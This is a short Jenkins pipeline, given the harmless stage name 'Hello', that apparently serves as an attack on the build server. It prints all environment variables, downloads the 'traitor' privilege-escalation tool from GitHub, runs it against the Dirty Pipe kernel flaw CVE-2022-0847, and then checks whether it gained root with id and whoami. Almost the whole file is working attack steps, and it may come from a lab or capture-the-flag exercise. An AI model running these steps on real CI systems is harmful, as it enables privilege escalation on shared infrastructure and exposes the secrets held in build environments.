pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh 'env'
                sh 'wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64'
                sh 'chmod 777 traitor-amd64'
                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
                sh 'sleep 15'
                sh 'id'
                sh 'whoami'
            }
        }
    }
}
